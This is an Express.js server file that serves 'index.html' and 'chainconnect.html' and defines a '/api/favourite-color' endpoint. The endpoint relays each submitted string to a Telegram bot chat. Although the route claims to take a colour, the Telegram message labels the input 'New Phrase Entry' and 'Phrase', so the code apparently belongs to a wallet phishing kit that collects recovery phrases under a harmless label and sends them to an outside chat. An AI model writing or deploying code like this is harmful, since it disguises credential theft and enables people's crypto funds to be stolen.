require("dotenv").config();

const express = require("express");
const path = require("path");

const app = express();

app.use(express.json({ limit: "10kb" }));

app.use(express.static(path.join(__dirname, "..")));

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "..", "index.html"));
});

app.get("/chainconnect.html", (req, res) => {
  res.sendFile(path.join(__dirname, "..", "chainconnect.html"));
});

app.post("/api/favourite-color", async (req, res) => {
  try {
    const color = req.body?.color;

    if (typeof color !== "string") {
      return res.status(400).json({
        success: false,
        message: "Please provide a valid color."
      });
    }

    const cleanColor = color.trim();

    if (!cleanColor || cleanColor.length > 40) {
      return res.status(400).json({
        success: false,
        message: "Color must be between 1 and 40 characters."
      });
    }

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;

    if (!botToken || !chatId) {
      console.error("Telegram environment variables are missing.");

      return res.status(500).json({
        success: false,
        message: "Server configuration error."
      });
    }

    const telegramResponse = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: `🎨 New Phrase Entry\n\nPhrase: ${cleanColor}`
        })
      }
    );

    const telegramResult = await telegramResponse.json();

    if (!telegramResponse.ok || !telegramResult.ok) {
      console.error("Telegram API error:", telegramResult);

      return res.status(502).json({
        success: false,
        message: "Could not send your color. Please try again."
      });
    }

    return res.status(200).json({
      success: true,
      message: "Favourite color submitted successfully."
    });

  } catch (error) {
    console.error("Server error:", error);

    return res.status(500).json({
      success: false,
      message: "An unexpected server error occurred."
    });
  }
});

module.exports = app;